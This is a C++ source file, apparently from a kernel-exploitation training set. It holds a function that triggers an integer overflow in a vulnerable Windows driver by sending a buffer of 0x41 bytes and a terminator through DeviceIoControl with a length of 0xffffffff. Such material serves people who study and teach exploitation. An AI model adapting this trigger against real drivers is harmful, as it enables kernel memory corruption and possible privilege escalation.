#include <Windows.h>
#include "Solutions.h"
#include "ioctal_codes.h"
#include "stdio.h"

DWORD Solutions::TriggerIntegerOverflow() {
	DWORD dwBufSize = 0x900;
	LONG lTerminatorValue = 0xBAD0B0B0;
	PUINT lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_INTEGER_OVERFLOW;
	DWORD dwBytesReturned = NULL;

	lpInBuffer = (PUINT)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize * sizeof(INT) + sizeof(INT));
	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer :(");
		return 1;
	}

	for (int i = 0; i < dwBufSize; i++) {
		lpInBuffer[i] = 0x41414141;
	}
	lpInBuffer[dwBufSize] = lTerminatorValue;
	wprintf(L"[+] Initialized buffer with 0x41");

	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
		NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver :(");
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	wprintf(L"[+] Succesfully talked with the driver");

	return 0;
}

